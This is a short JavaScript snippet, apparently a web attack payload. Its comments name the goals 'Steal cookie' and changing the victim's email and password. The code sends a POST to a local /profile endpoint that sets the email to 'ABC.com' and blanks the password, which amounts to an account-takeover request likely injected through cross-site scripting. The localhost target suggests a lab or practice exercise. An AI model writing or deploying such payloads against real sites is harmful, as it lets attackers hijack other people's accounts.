// Target
// Steal cookie
// Send POST to change email and password

fetch("http://127.0.0.1:5000/profile", {
  method: "POST",
  body: JSON.stringify({
    email: "ABC.com",
    password: ""
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8",
  },
});